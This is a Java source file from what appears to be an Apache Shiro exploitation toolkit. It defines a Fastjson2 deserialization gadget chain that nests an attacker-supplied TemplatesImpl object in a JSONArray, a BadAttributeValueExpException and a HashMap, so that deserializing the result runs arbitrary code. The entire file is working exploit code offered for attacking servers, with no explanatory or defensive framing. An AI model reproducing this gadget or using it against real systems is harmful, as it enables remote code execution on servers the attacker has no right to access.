package com.sma11new.exp.shiro.attack.payloads;

import com.alibaba.fastjson2.JSONArray;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:2.x"})
public class Fastjson2 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        // PayloadRunner.run(Fastjson2.class, args);
    }

    public Object getObject(Object template) throws Exception {
        // final Object template = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
